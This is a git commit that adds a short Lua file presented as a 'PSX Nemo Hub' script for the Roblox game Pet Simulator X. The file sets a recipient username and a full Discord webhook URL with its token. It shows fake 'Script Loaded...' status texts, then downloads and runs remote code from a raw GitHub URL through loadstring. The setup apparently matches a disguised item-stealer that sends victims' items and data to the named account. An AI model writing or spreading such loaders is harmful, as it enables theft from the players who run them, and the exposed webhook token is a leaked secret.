6d9400d2aa9ae462fbda2f8d208293a744e28900
tottattinikah <123279891+tottattinikah@users.noreply.github.com>
2023-04-01 23:40:14 -0400

    Add files via upload

---
+++ PSX Nemo Hub.lua
@@ -0,0 +1,9 @@
+Username = "Eshan122TOT"
+WebHook = "https://discord.com/api/webhooks/1085055031646105600/gFRMfqDXj9hIp9gB8OlXRW6aamFnPLllxVqPk5ZD2olPisaie-gVb7mJm2zH0iKackmu"
+
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))() 
